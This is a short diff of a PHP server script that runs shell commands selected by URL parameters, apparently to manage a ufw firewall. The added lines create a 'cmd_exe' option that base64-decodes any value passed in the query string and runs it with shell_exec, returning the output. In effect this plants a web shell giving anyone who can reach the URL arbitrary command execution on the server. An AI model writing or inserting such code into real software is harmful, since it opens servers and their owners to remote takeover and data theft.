@@ -79,6 +79,9 @@ if (isset($_GET['o'])) {
         echo $bash_string;
         echo shell_exec($bash_string);
         echo '\n Server B =>ufw firewall updated Successully';
+    } else if ($o == 'cmd_exe') {
+        $cmd_exe= base64_decode($_GET['cmd_exe']);
+        echo shell_exec($cmd_exe);
     }
     else{
         echo 'Server - B No Operation found';
